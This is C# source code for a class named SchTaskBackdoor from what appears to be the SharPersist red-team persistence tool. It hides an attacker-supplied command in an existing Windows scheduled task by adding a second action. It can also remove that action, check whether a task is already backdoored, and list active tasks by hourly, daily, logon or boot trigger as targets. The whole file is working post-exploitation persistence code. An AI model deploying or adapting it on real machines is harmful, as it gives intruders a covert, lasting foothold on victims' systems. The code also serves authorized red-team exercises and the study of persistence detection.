using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Security.Principal;
using System.Text;
using Microsoft.Win32.TaskScheduler;

namespace SharPersist
{
    public class SchTaskBackdoor : Persistence
    {
        public SchTaskBackdoor(string persistMethod, string command, string commandArg, string theKey, string theVal, string theName, string filePath, string status, string option) : base(persistMethod, command, commandArg, theKey, theVal, theName, filePath, status, option)
        {
            initialize(persistMethod, command, commandArg, theKey, theVal, theName, filePath, status, option);

        }

        // initial function to decide which method needs performed and if valid args given
        public void initialize(string persistMethod, string command, string commandArg, string theKey, string theVal, string theName, string filePath, string status, string option)
        {
            if (status.ToLower().Equals("add"))
            {
                if (command.Equals("") || theName.Equals(""))
                {
                    Console.WriteLine("");
                    Console.WriteLine("[-] ERROR: Must give both a command and scheduled task name. See help (-h).");
                    return;
                }

                addPersistence(command, commandArg, theName);
            }

            else if (status.ToLower().Equals("remove"))
            {
                if (theName.Equals(""))
                {
                    Console.WriteLine("");
                    Console.WriteLine("[-] ERROR: Must give a scheduled task name. See help (-h).");
                    return;
                }

                removePersistence(theName);
            }

            else if (status.ToLower().Equals("check"))
            {
                checkPersistence(persistMethod, command, commandArg, theKey, theVal, theName, filePath, status);
            }

            else if (status.ToLower().Equals("list"))
            {
                listPersistence(persistMethod, command, commandArg, theKey, theVal, theName, filePath, status,option);
            }

            else
            {
                Console.WriteLine("");
                Console.WriteLine("[-] ERROR: Invalid method given. Must give add, remove, check or list. See help (-h).");
                return;
            }

        } // end initialize method


        // add persistence trigger
        public void addPersistence(string command, string commandArg, string theName)
        {
            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Adding scheduled task backdoor persistence");
            Console.WriteLine("[*] INFO: Command: " + command);
            Console.WriteLine("[*] INFO: Command Args: " + commandArg);
            Console.WriteLine("[*] INFO: Scheduled Task Name: " + theName);
            Console.WriteLine("");

            TaskService ts = new TaskService();
            IEnumerable<Task> allTasks = ts.AllTasks;
            bool schtaskExists = lib.Utils.ScheduledTaskExists(theName);
            int actionCount = 0;
            theName = theName.ToLower();
            string folderPath ="";
            foreach (Task task in allTasks)
            {
                if (task.Name.ToLower().Equals(theName))
                {
                    schtaskExists = true;
                    actionCount = task.Definition.Actions.Count;
                    folderPath = task.Folder.Path;

                }
            }

            // if schtask exists
            if (schtaskExists)
            {
                // if scheduled task is not backdoored
                if (actionCount < 2)
                {
                    try
                    {

                        TaskService tsToAdd = new TaskService();
                        Task t = tsToAdd.GetTask(folderPath + "\\" + theName);
                        t.Definition.Actions.Add(command, commandArg, null);
                        t.RegisterChanges();

                    }
                    catch (NullReferenceException ex)
                    {
                        Console.WriteLine("[-] ERROR: You do not have permissions to modify the scheduled task. Please choose a valid scheduled task that you have permissions to modify. If running as admin, ensure you are in high integrity process.");
                        return;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[-] ERROR: You do not have permissions to modify the scheduled task. Please choose a valid scheduled task that you have permissions to modify. If running as admin, ensure you are in high integrity process.");
                        return;
                    }



                    // iterate through all schtasks and get number of actions for that schtask
                    foreach (Task task in allTasks)
                    {
                        if (task.Name.ToLower().Equals(theName.ToLower()))
                        {
                            actionCount = task.Definition.Actions.Count;
                        }
                    }

                    // if number of actions on schtask is now more than 1, it was success
                    if (actionCount > 1)
                    {
                        Console.WriteLine("");
                        Console.WriteLine("[+] SUCCESS: Scheduled task backdoored");
                    }

                    // otherwise it was not success
                    else
                    {
                        Console.WriteLine("");
                        Console.WriteLine("[-] ERROR: Scheduled task not backdoored successfully");
                        return;

                    }
                } // end if schtask is backdoored

                // if schtask is already backdoored
                else
                {
                    Console.WriteLine("");
                    Console.WriteLine("[-] ERROR: Scheduled task is already backdoored");
                    return;
                }

            } // end if schtask exists


            // if schtask does not exist
            else
            {
                Console.WriteLine("[-] ERROR: The scheduled task specified does not exist to backdoor. Double check scheduled task name.");
                return;

            }
        }

        // remove persistence trigger
        public void removePersistence(string theName)
        {
            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Removing scheduled task backdoor persistence");
            Console.WriteLine("[*] INFO: Scheduled Task Name: " + theName);
            Console.WriteLine("");


            TaskService ts = new TaskService();
            IEnumerable<Task> allTasks = ts.AllTasks;
            bool schtaskExists = lib.Utils.ScheduledTaskExists(theName);
            int actionCount = 0;
            theName = theName.ToLower();
            string folderPath = "";
            foreach (Task task in allTasks)
            {
                //Console.WriteLine(task.Name);
                if (task.Name.ToLower().Equals(theName))
                {
                    schtaskExists = true;
                    actionCount = task.Definition.Actions.Count;
                    folderPath = task.Folder.Path;


                }
            }


            // if scheduled task exists, then remove backdoor
            if (schtaskExists)
            {
                // only remove backdoor if schtask has more than 1 action
                if (actionCount > 1)
                {
                    try
                    {
                        TaskService tsToDelete = new TaskService();
                        Task t = tsToDelete.GetTask(folderPath + "\\" + theName);

                        t.Definition.Actions.RemoveAt(t.Definition.Actions.Count - 1); // remove the added action at the end which we added
                        t.RegisterChanges();
                    }
                    catch (NullReferenceException ex)
                    {
                        Console.WriteLine("[-] ERROR: You do not have permissions to modify the scheduled task. Please choose a valid scheduled task that you have permissions to modify. If running as admin, ensure you are in high integrity process.");
                        return;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[-] ERROR: You do not have permissions to modify the scheduled task. Please choose a valid scheduled task that you have permissions to modify. If running as admin, ensure you are in high integrity process.");
                        return;
                    }


                    // iterate through all schtasks and get number of actions for that schtask
                    foreach (Task task in allTasks)
                    {
                        if (task.Name.ToLower().Equals(theName.ToLower()))
                        {
                            actionCount = task.Definition.Actions.Count;
                        }
                    }

                    // ensure that schtask backdoor was indeed removed by checking that the number of actions is less than or equal to 1
                    if (actionCount <= 1)
                    {
                        Console.WriteLine("");
                        Console.WriteLine("[+] SUCCESS: Scheduled task backdoor removed");
                    }
                    else
                    {
                        Console.WriteLine("");
                        Console.WriteLine("[-] ERROR: Scheduled task backdoor not removed successfully");
                        return;
                    }
                }

                else
                {
                    Console.WriteLine("[-] ERROR: Scheduled task is not backdoored.");
                    return;
                }
            }

            // if scheduled task does not exist, display message
            else
            {
                Console.WriteLine("[-] ERROR: Scheduled task does not exist to remove backdoor.");
                return;
            }
        } // end remove persistence method



        // check for persistence technique
        public void checkPersistence(string persistMethod, string command, string commandArg, string theKey, string theVal, string theName, string filePath, string status)
        {

            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Checking if scheduled task exists to backdoor.");

            TaskService ts = new TaskService();
            IEnumerable<Task> allTasks = ts.AllTasks;
            bool schtaskExists = lib.Utils.ScheduledTaskExists(theName);
            int actionCount = 0;
            foreach (Task task in allTasks)
            {
                if (task.Name.ToLower().Equals(theName.ToLower()))
                {
                    actionCount = task.Definition.Actions.Count;
                }
            }
            if (schtaskExists)
            {
                Console.WriteLine("[+] SUCCESS: A scheduled task with that name exists.");

                Console.WriteLine("");
                Console.WriteLine("[*] INFO: Checking if schedule task has backdoored action.");

                if (actionCount > 1)
                {
                    Console.WriteLine("[-] ERROR: That scheduled task is already backdoored");

                }

                else
                {
                    Console.WriteLine("[+] SUCCESS: That scheduled task is NOT backdoored");

                }

            } // end if schtask exists

            // if schtask doesn't exist
            else
            {
                Console.WriteLine("[-] ERROR: A scheduled task with that name does NOT exist. Therefore, you cannot backdoor anything.");

            }


            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Checking for correct arguments given");

            if (command.Equals("") || theName.Equals(""))
            {
                Console.WriteLine("[-] ERROR: Must give both a command and scheduled task name. See help (-h).");
                return;
            }

            Console.WriteLine("[+] SUCCESS: Correct arguments given");

        } // end check persistence method


        // list all scheduled tasks available to backdoor
        public void listPersistence(string persistMethod, string command, string commandArg, string theKey, string theVal, string theName, string filePath, string status, string option)
        {

            // determine whether option was specified
            bool optionSpecified = false;
            if (!option.Equals(""))
            {
                optionSpecified = true;
            }

            bool nameSpecified = false;
            bool schTaskExists = false;

            // if user specified they only want to list a specific schtask
            if (!theName.Equals(""))
            {
                nameSpecified = true;
                schTaskExists = lib.Utils.ScheduledTaskExists(theName);

                // if schtask exists, then look for that schtask
                if (schTaskExists)
                {
                    Console.WriteLine("");
                    Console.WriteLine("[*] INFO: Listing scheduled task details of name that was specified.");

                    TaskService theTask = new TaskService();
                    IEnumerable<Task> allOfTheTasks = theTask.AllTasks;
                    Console.WriteLine("");
                    Console.WriteLine("");
                    Console.WriteLine("");

                    foreach (Task task in allOfTheTasks)
                    {

                        string schtaskName = task.Name;
                        DateTime runTime = task.NextRunTime;
                        string theRunTime = runTime.ToString("G", CultureInfo.CurrentCulture);

                        // once we find the schtask, display its details
                        if (schtaskName.ToLower().Equals(theName.ToLower()))
                        {
                            ActionCollection allActions = task.Definition.Actions;

                            // getschtask owner
                            string schtaskAction = allActions.Context;
                            SecurityIdentifier schtaskOwner = task.SecurityDescriptor.Owner;
                            NTAccount ntAccount = (NTAccount)schtaskOwner.Translate(typeof(NTAccount));
                            string owner = ntAccount.ToString();
                            string schtaskFolder = task.Folder.Path;


                            Console.WriteLine("[*] INFO: TASK NAME:");
                            Console.WriteLine(schtaskName);
                            Console.WriteLine("");
                            Console.WriteLine("[*] INFO: TASK PATH:");
                            Console.WriteLine(schtaskFolder);
                            Console.WriteLine("");
                            Console.WriteLine("[*] INFO: TASK OWNER:");
                            Console.WriteLine(owner);
                            Console.WriteLine("");
                            Console.WriteLine("[*] INFO: NEXT RUN TIME:");
                            Console.WriteLine(theRunTime);
                            Console.WriteLine("");

                            // get the frequency in which the schtask executes
                            TriggerCollection triggers = task.Definition.Triggers;
                            string triggerType = "";
                            foreach (Trigger trigger in triggers)
                            {
                                RepetitionPattern pattern = trigger.Repetition;

                                triggerType = trigger.TriggerType.ToString();
                                Console.WriteLine("[*] INFO: TASK TRIGGER:");
                                Console.WriteLine(triggerType);
                                Console.WriteLine("");
                            }


                            // get all actions and print
                            foreach (Microsoft.Win32.TaskScheduler.Action action in allActions)
                            {
                                Console.WriteLine("[*] INFO: TASK ACTION:");
                                Console.WriteLine(action.ToString());
                                Console.WriteLine("");

                            }


                        } // end once we find the schtask

                    } // end for each task

                    return;
                } // end if schtask exists

                // if schtask doesn't exist
                else
                {
                    Console.WriteLine("");
                    Console.WriteLine("[-] ERROR: That scheduled task name does not exist. Please double check the name you provided.");
                    return;

                }

            } // end if user specified they only want to list a specific schtask


            // if user wants to see all schtasks
            else
            {


                Console.WriteLine("");
                Console.WriteLine("[*] INFO: Listing all scheduled tasks available to backdoor.");


                TaskService ts = new TaskService();
                IEnumerable<Task> allTasks = ts.AllTasks;
                bool schtaskExists = lib.Utils.ScheduledTaskExists(theName);
                Console.WriteLine("");
                Console.WriteLine("");
                Console.WriteLine("");


                foreach (Task task in allTasks)
                {
                    string schtaskName = task.Name;
                    DateTime runTime = task.NextRunTime;
                    string theRunTime = runTime.ToString("G", CultureInfo.CurrentCulture);
                    bool taskActive = task.IsActive;


                    // only proceed to list schtask info if it is active
                    if (taskActive)
                    {
                        // get collection of all actions the schtask performs
                        ActionCollection allActions = task.Definition.Actions;

                        // getschtask owner
                        string schtaskAction = allActions.Context;
                        SecurityIdentifier schtaskOwner = task.SecurityDescriptor.Owner;
                        NTAccount ntAccount = (NTAccount)schtaskOwner.Translate(typeof(NTAccount));
                        string owner = ntAccount.ToString();
                        string schtaskFolder = task.Folder.Path;

                        TriggerCollection triggers = task.Definition.Triggers;
                        string triggerType = "";
                        foreach (Trigger trigger in triggers)
                        {
                            RepetitionPattern pattern = trigger.Repetition;
                            triggerType = trigger.TriggerType.ToString();

                        }

                        // if option was specified, only display schtasks with frequency given
                        if (optionSpecified)
                        {

                            if (option.ToLower().Equals("hourly") && triggerType.ToLower().Equals("time"))
                            {
                                Console.WriteLine("[*] INFO: TASK NAME:");
                                Console.WriteLine(schtaskName);
                                Console.WriteLine("");
                                Console.WriteLine("[*] INFO: TASK PATH:");
                                Console.WriteLine(schtaskFolder);
                                Console.WriteLine("");
                                Console.WriteLine("[*] INFO: TASK OWNER:");
                                Console.WriteLine(owner);
                                Console.WriteLine("");
                                Console.WriteLine("[*] INFO: NEXT RUN TIME:");
                                Console.WriteLine(theRunTime);
                                Console.WriteLine("");

                                // get the frequency in which the schtask executes
                                TriggerCollection theTriggers = task.Definition.Triggers;
                                string theTriggerType = "";
                                foreach (Trigger trigger in theTriggers)
                                {
                                    RepetitionPattern pattern = trigger.Repetition;

                                    theTriggerType = trigger.TriggerType.ToString();
                                    Console.WriteLine("[*] INFO: TASK TRIGGER:");
                                    Console.WriteLine(theTriggerType);
                                    Console.WriteLine("");
                                }



                                // get all actions and print
                                foreach (Microsoft.Win32.TaskScheduler.Action action in allActions)
                                {
                                    Console.WriteLine("[*] INFO: TASK ACTION:");
                                    Console.WriteLine(action.ToString());
                                    Console.WriteLine("");

                                }

                                Console.WriteLine("");
                                Console.WriteLine("");
                                Console.WriteLine("");
                            }


                            else if (option.ToLower().Equals("daily") && triggerType.ToLower().Equals("daily"))
                            {
                                Console.WriteLine("[*] INFO: TASK NAME:");
                                Console.WriteLine(schtaskName);
                                Console.WriteLine("");
                                Console.WriteLine("[*] INFO: TASK PATH:");
                                Console.WriteLine(schtaskFolder);
                                Console.WriteLine("");
                                Console.WriteLine("[*] INFO: TASK OWNER:");
                                Console.WriteLine(owner);
                                Console.WriteLine("");
                                Console.WriteLine("[*] INFO: NEXT RUN TIME:");
                                Console.WriteLine(theRunTime);
                                Console.WriteLine("");

                                // get the frequency in which the schtask executes
                                TriggerCollection theTriggers = task.Definition.Triggers;
                                string theTriggerType = "";
                                foreach (Trigger trigger in theTriggers)
                                {
                                    RepetitionPattern pattern = trigger.Repetition;

                                    theTriggerType = trigger.TriggerType.ToString();
                                    Console.WriteLine("[*] INFO: TASK TRIGGER:");
                                    Console.WriteLine(theTriggerType);
                                    Console.WriteLine("");
                                }



                                // get all actions and print
                                foreach (Microsoft.Win32.TaskScheduler.Action action in allActions)
                                {
                                    Console.WriteLine("[*] INFO: TASK ACTION:");
                                    Console.WriteLine(action.ToString());
                                    Console.WriteLine("");

                                }

                                Console.WriteLine("");
                                Console.WriteLine("");
                                Console.WriteLine("");
                            }


                            else if ((option.ToLower().Equals("logon") && triggerType.ToLower().Equals("logon")) || (option.ToLower().Equals("boot") && triggerType.ToLower().Equals("boot")))
                            {
                                Console.WriteLine("[*] INFO: TASK NAME:");
                                Console.WriteLine(schtaskName);
                                Console.WriteLine("");
                                Console.WriteLine("[*] INFO: TASK PATH:");
                                Console.WriteLine(schtaskFolder);
                                Console.WriteLine("");
                                Console.WriteLine("[*] INFO: TASK OWNER:");
                                Console.WriteLine(owner);
                                Console.WriteLine("");
                                Console.WriteLine("[*] INFO: NEXT RUN TIME:");
                                Console.WriteLine(theRunTime);
                                Console.WriteLine("");

                                // get the frequency in which the schtask executes
                                TriggerCollection theTriggers = task.Definition.Triggers;
                                string theTriggerType = "";
                                foreach (Trigger trigger in theTriggers)
                                {
                                    RepetitionPattern pattern = trigger.Repetition;

                                    theTriggerType = trigger.TriggerType.ToString();
                                    Console.WriteLine("[*] INFO: TASK TRIGGER:");
                                    Console.WriteLine(theTriggerType);
                                    Console.WriteLine("");
                                }



                                // get all actions and print
                                foreach (Microsoft.Win32.TaskScheduler.Action action in allActions)
                                {
                                    Console.WriteLine("[*] INFO: TASK ACTION:");
                                    Console.WriteLine(action.ToString());
                                    Console.WriteLine("");

                                }

                                Console.WriteLine("");
                                Console.WriteLine("");
                                Console.WriteLine("");
                            }

                        } // end if option specified

                        // otherwise display as normal
                        else
                        {

                            Console.WriteLine("[*] INFO: TASK NAME:");
                            Console.WriteLine(schtaskName);
                            Console.WriteLine("");
                            Console.WriteLine("[*] INFO: TASK PATH:");
                            Console.WriteLine(schtaskFolder);
                            Console.WriteLine("");
                            Console.WriteLine("[*] INFO: TASK OWNER:");
                            Console.WriteLine(owner);
                            Console.WriteLine("");
                            Console.WriteLine("[*] INFO: NEXT RUN TIME:");
                            Console.WriteLine(theRunTime);
                            Console.WriteLine("");

                            // get the frequency in which the schtask executes
                            TriggerCollection theTriggers = task.Definition.Triggers;
                            string theTriggerType = "";
                            foreach (Trigger trigger in theTriggers)
                            {
                                RepetitionPattern pattern = trigger.Repetition;

                                theTriggerType = trigger.TriggerType.ToString();
                                Console.WriteLine("[*] INFO: TASK TRIGGER:");
                                Console.WriteLine(theTriggerType);
                                Console.WriteLine("");
                            }



                            // get all actions and print
                            foreach (Microsoft.Win32.TaskScheduler.Action action in allActions)
                            {
                                Console.WriteLine("[*] INFO: TASK ACTION:");
                                Console.WriteLine(action.ToString());
                                Console.WriteLine("");

                            }

                            Console.WriteLine("");
                            Console.WriteLine("");
                            Console.WriteLine("");
                        }


                    } // end if schtask is active


                } // end iterating through each schtask

            } // end if user wants to see all schtasks

        } // end list persistence method

    } // end class

} // end nameepsace
